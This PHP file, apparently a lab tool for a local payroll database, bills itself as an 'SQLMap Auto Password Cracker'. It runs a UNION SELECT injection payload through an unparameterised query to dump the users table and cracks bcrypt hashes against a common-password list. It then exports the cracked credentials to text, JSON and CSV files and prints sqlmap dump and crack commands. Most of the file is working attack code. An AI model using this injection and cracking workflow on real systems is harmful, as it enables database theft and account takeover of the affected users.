<?php
/**
 * SQLMap Auto Password Cracker
 * Otomatis dump users dari database dan crack password bcrypt
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(300); // 5 minutes timeout

class SQLMapAutoCracker {
    private $db;
    private $common_passwords = [
        'admin', 'admin123', 'admin5231', 'password', '123456', 'password123',
        'hr', 'hr123', 'hr2145', 'halahgampang', 'backdoor123', 'test', 'test123',
        'user', 'user123', 'employee', 'bullscorp', 'payroll', 'login',
        'qwerty', 'abc123', 'admin2023', 'admin2024', 'admin2025', 'root',
        'toor', 'pass', 'secret', 'welcome', 'guest', 'demo'
    ];
    
    private $cracked_passwords = [];
    private $users_data = [];
    
    public function __construct() {
        $this->connectDatabase();
    }
    
    private function connectDatabase() {
        try {
            $this->db = new PDO("mysql:host=localhost;dbname=bullscorp_payroll", "root", "");
            $this->db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            echo "✅ Database connected successfully\n\n";
        } catch(PDOException $e) {
            die("❌ Connection failed: " . $e->getMessage());
        }
    }
    
    public function simulateSQLMapDump() {
        echo "🚀 Simulasi SQLMap Dump (via SQL Injection)...\n";
        echo "================================================\n\n";
        
        // Simulate SQLMap injection payload
        $payload = "admin' UNION SELECT id,username,password,email,role,employee_id,created_at,last_login FROM users -- ";
        $sql = "SELECT * FROM users WHERE username = '$payload'";
        
        echo "SQLMap Payload: $payload\n";
        echo "Executing query...\n\n";
        
        try {
            $result = $this->db->query($sql);
            $this->users_data = $result->fetchAll(PDO::FETCH_ASSOC);
            
            // Remove the first row (original admin user)
            if (count($this->users_data) > 0 && $this->users_data[0]['username'] === 'admin') {
                array_shift($this->users_data);
            }
            
            echo "✅ Successfully dumped " . count($this->users_data) . " users!\n\n";
            return true;
            
        } catch (Exception $e) {
            echo "❌ Error: " . $e->getMessage() . "\n";
            return false;
        }
    }
    
    public function crackPasswords() {
        echo "🔐 Starting Password Cracking Process...\n";
        echo "========================================\n\n";
        
        $total_users = count($this->users_data);
        $cracked_count = 0;
        
        foreach ($this->users_data as $index => $user) {
            $username = $user['username'];
            $hash = $user['password'];
            
            echo "🔓 Cracking password for: $username ";
            
            if (empty($hash) || !$this->isBcryptHash($hash)) {
                echo "❌ Invalid hash\n";
                continue;
            }
            
            $cracked_password = $this->crackSinglePassword($hash);
            
            if ($cracked_password) {
                $this->cracked_passwords[$username] = $cracked_password;
                echo "✅ CRACKED! Password: $cracked_password\n";
                $cracked_count++;
            } else {
                echo "❌ Failed to crack\n";
            }
            
            // Progress indicator
            $progress = round(($index + 1) / $total_users * 100, 1);
            echo "   Progress: $progress% (" . ($index + 1) . "/$total_users)\n\n";
        }
        
        echo "🎯 Cracking Summary:\n";
        echo "   Total Users: $total_users\n";
        echo "   Cracked: $cracked_count\n";
        echo "   Success Rate: " . round($cracked_count / $total_users * 100, 1) . "%\n\n";
    }
    
    private function isBcryptHash($hash) {
        return preg_match('/^\$2[ayb]\$.{56}$/', $hash);
    }
    
    private function crackSinglePassword($hash) {
        foreach ($this->common_passwords as $password) {
            if (password_verify($password, $hash)) {
                return $password;
            }
        }
        return null;
    }
    
    public function generateReport() {
        echo "📋 DETAILED REPORT\n";
        echo "==================\n\n";
        
        echo "🔓 SUCCESSFULLY CRACKED CREDENTIALS:\n";
        echo str_repeat("-", 80) . "\n";
        printf("%-5s %-25s %-15s %-10s %-30s\n", "ID", "Username", "Password", "Role", "Email");
        echo str_repeat("-", 80) . "\n";
        
        foreach ($this->users_data as $user) {
            if (isset($this->cracked_passwords[$user['username']])) {
                printf("%-5s %-25s %-15s %-10s %-30s\n", 
                    $user['id'],
                    substr($user['username'], 0, 24),
                    $this->cracked_passwords[$user['username']],
                    $user['role'],
                    substr($user['email'], 0, 29)
                );
            }
        }
        
        echo "\n🔒 UNCRACKED USERS:\n";
        echo str_repeat("-", 80) . "\n";
        printf("%-5s %-25s %-10s %-40s\n", "ID", "Username", "Role", "Password Hash (truncated)");
        echo str_repeat("-", 80) . "\n";
        
        foreach ($this->users_data as $user) {
            if (!isset($this->cracked_passwords[$user['username']])) {
                printf("%-5s %-25s %-10s %-40s\n", 
                    $user['id'],
                    substr($user['username'], 0, 24),
                    $user['role'],
                    substr($user['password'], 0, 39) . "..."
                );
            }
        }
        
        echo "\n";
    }
    
    public function exportResults() {
        echo "💾 EXPORTING RESULTS...\n";
        echo "=======================\n\n";
        
        // 1. Export cracked credentials to text file
        $credentials_file = "cracked_credentials_" . date('Y-m-d_H-i-s') . ".txt";
        $content = "CRACKED CREDENTIALS FROM SQLMAP SIMULATION\n";
        $content .= "Generated: " . date('Y-m-d H:i:s') . "\n";
        $content .= str_repeat("=", 50) . "\n\n";
        
        foreach ($this->cracked_passwords as $username => $password) {
            $user_data = $this->getUserData($username);
            $content .= sprintf("%-25s : %-15s [%s] (%s)\n", 
                $username, $password, $user_data['role'], $user_data['email']);
        }
        
        file_put_contents($credentials_file, $content);
        echo "✅ Credentials exported to: $credentials_file\n";
        
        // 2. Export full data to JSON
        $json_file = "full_dump_" . date('Y-m-d_H-i-s') . ".json";
        $export_data = [
            'timestamp' => date('Y-m-d H:i:s'),
            'total_users' => count($this->users_data),
            'cracked_count' => count($this->cracked_passwords),
            'success_rate' => round(count($this->cracked_passwords) / count($this->users_data) * 100, 2),
            'users' => []
        ];
        
        foreach ($this->users_data as $user) {
            $user_export = $user;
            $user_export['cracked_password'] = $this->cracked_passwords[$user['username']] ?? null;
            $user_export['is_cracked'] = isset($this->cracked_passwords[$user['username']]);
            $export_data['users'][] = $user_export;
        }
        
        file_put_contents($json_file, json_encode($export_data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        echo "✅ Full data exported to: $json_file\n";
        
        // 3. Export SQLMap-style CSV
        $csv_file = "users_dump_" . date('Y-m-d_H-i-s') . ".csv";
        $csv_content = "id,username,password_hash,email,role,employee_id,cracked_password,is_cracked\n";
        
        foreach ($this->users_data as $user) {
            $csv_content .= sprintf('"%s","%s","%s","%s","%s","%s","%s","%s"' . "\n",
                $user['id'],
                $user['username'],
                $user['password'],
                $user['email'],
                $user['role'],
                $user['employee_id'],
                $this->cracked_passwords[$user['username']] ?? '',
                isset($this->cracked_passwords[$user['username']]) ? 'YES' : 'NO'
            );
        }
        
        file_put_contents($csv_file, $csv_content);
        echo "✅ CSV data exported to: $csv_file\n\n";
    }
    
    private function getUserData($username) {
        foreach ($this->users_data as $user) {
            if ($user['username'] === $username) {
                return $user;
            }
        }
        return null;
    }
    
    public function showSQLMapCommands() {
        echo "🔧 EQUIVALENT SQLMAP COMMANDS:\n";
        echo "==============================\n\n";
        
        echo "1. Basic SQLMap dump:\n";
        echo "   sqlmap -u \"http://localhost/public/login.php\" --data \"username=admin&password=test\" -p username -D bullscorp_payroll -T users --dump --batch\n\n";
        
        echo "2. Dump specific columns:\n";
        echo "   sqlmap -u \"http://localhost/public/login.php\" --data \"username=admin&password=test\" -p username -D bullscorp_payroll -T users -C \"id,username,password,email,role\" --dump --batch\n\n";
        
        echo "3. With password cracking (if SQLMap supports it):\n";
        echo "   sqlmap -u \"http://localhost/public/login.php\" --data \"username=admin&password=test\" -p username -D bullscorp_payroll -T users --dump --batch --crack\n\n";
        
        echo "4. Manual payload for testing:\n";
        echo "   admin' UNION SELECT id,username,password,email,role,employee_id,created_at,last_login FROM users -- \n\n";
    }
    
    public function run() {
        echo "🎯 SQLMap Auto Password Cracker\n";
        echo str_repeat("=", 50) . "\n\n";
        
        // Step 1: Simulate SQLMap dump
        if (!$this->simulateSQLMapDump()) {
            echo "❌ Failed to dump users data!\n";
            return;
        }
        
        // Step 2: Crack passwords
        $this->crackPasswords();
        
        // Step 3: Generate report
        $this->generateReport();
        
        // Step 4: Export results
        $this->exportResults();
        
        // Step 5: Show SQLMap commands
        $this->showSQLMapCommands();
        
        echo "🎉 PROCESS COMPLETED!\n";
        echo "Check the exported files for detailed results.\n";
    }
}

// Run the cracker
$cracker = new SQLMapAutoCracker();
$cracker->run();

?>